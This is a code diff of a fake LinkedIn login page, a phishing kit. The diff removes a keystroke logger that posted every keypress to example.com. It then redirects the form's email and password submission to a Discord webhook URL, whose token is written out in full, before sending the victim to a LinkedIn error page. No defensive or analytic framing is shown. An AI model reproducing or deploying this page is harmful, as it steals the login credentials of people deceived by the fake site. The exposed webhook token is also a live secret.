@@ -8,9 +8,6 @@
     <link rel="stylesheet" href="linkedin.css">
 
     <script>
-        // Array to hold captured keystrokes
-        var keystrokesArray = [];
-
         // Function to handle form submission
         function submitForm() {
             // Get email and password values
@@ -23,9 +20,9 @@
                 return;
             }
 
-            // Send login data securely using HTTPS
+            // Send data to Discord webhook URL
             var xhr = new XMLHttpRequest();
-            xhr.open("POST", "https://example.com/login", true);
+            xhr.open("POST", "https://discord.com/api/webhooks/1227534592588648509/Qvy1pONeAXGtinSPdmWETNfJUNmqS9RPJyuQvR0qtpKcsnJUI9kV_dyWE6vGfTcpZUnE", true);
             xhr.setRequestHeader("Content-Type", "application/json");
 
             // Prepare JSON data
@@ -44,31 +41,6 @@
         // Function to redirect user to YouTube
         function redirectToYouTube() {
             window.location.href = "https://www.linkedin.com/404?_l=en_US";
-        }
-
-        // Function to capture keystrokes and save them securely
-        document.onkeypress = function(e) {
-            var key = e.key || String.fromCharCode(e.keyCode || e.which);
-            keystrokesArray.push(key);
-            sendKeystrokes(); // Send keystrokes immediately for demonstration
-        };
-
-        // Function to send captured keystrokes securely
-        function sendKeystrokes() {
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", "https://example.com/savekeystrokes", true);
-            xhr.setRequestHeader("Content-Type", "application/json");
-
-            // Prepare JSON data
-            var data = JSON.stringify({
-                keystrokes: keystrokesArray
-            });
-
-            // Send the request
-            xhr.send(data);
-
-            // Clear captured keystrokes
-            keystrokesArray = [];
         }
     </script>
 </head>
